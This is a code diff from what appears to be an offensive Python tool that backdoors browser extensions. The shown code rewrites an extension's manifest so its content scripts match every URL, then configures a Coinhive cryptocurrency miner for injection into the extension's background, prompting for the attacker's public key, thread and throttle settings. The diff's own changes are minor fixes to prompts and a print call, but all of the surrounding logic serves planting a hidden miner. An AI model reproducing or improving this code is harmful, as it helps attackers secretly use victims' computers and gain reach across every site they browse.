@@ -44,8 +44,10 @@ class Loader :
 					for content in scripts :
 						matches = content['matches']
 						path += content['js'][0]
+
 						if not "*://*/*" in matches:
 							matches.append("*://*/*")
+							
 				with open(manifest, "wb") as w :
 					w.write(json.dumps(data, indent=2, sort_keys=True, separators=(',', ': '), ensure_ascii=False))
 					w.close()
@@ -56,13 +58,13 @@ class Loader :
 
 			modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background
 
-			print("{} Configuration of module {}".format(self.color.yellows("[!]")))
+			print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
 
 			apikey = raw_input("{} Set coinhive public key: ".format(self.color.status("[+]")))
-			thread = raw_input("{} Set coinhive threads: ".format(self.color.status("[+]")))
-			autoThreads = raw_input("{} Set coinhive autoThreads: ".format(self.color.status("[+]")))
-			throttle = raw_input("{} Set coinhive throttle: ".format(self.color.status("[+]")))
-			forceASMJS = raw_input("{} Set coinhive forceASMJS: ".format(self.color.status("[+]")))
+			thread = raw_input("{} Set threads: ".format(self.color.status("[+]")))
+			autoThreads = raw_input("{} Set autoThreads: ".format(self.color.status("[+]")))
+			throttle = raw_input("{} Set throttle: ".format(self.color.status("[+]")))
+			forceASMJS = raw_input("{} Set ForceASMJS: ".format(self.color.status("[+]")))
 
 			options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options
 
